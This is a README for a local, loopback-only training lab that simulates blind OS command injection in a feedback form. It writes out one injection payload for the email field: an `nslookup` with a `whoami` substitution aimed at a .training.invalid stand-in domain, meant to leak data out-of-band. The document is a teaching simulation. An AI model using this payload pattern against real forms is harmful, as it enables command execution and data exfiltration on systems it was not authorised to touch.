# Blind Command Injection Lab (Simulation)

A local-only feedback-form exercise inspired by blind OS command injection labs. It accepts `name`, `email`, and `message` at one endpoint (`/`) and responds with HTTP 200 immediately. A narrowly recognized training payload produces an asynchronous, simulated DNS-lookup line in the server terminal.

**This is a simulation, not an executable command-injection vulnerability.** It does not pass input to a shell, execute `whoami`, or perform DNS/network lookups. The username is a fixed training value (`training-user`), and the only recognized destination suffix is `.training.invalid`. Burp Collaborator and real out-of-band data exfiltration are not supported.

## Run

Requires Node.js 20 or newer.

```bash
npm install
npm start
```

Open <http://127.0.0.1:4321>. Keep the server bound to loopback; do not expose it to any network. Submit feedback normally, or use a local HTTP request editor to set the email field to:

```text
||nslookup+`whoami`.training.invalid||
```

The response remains `200 OK`. For the matching training input, the server terminal prints a simulated lookup such as:

```text
[simulated DNS; no network] training-user.training.invalid
```

Run the tests with `npm test`.
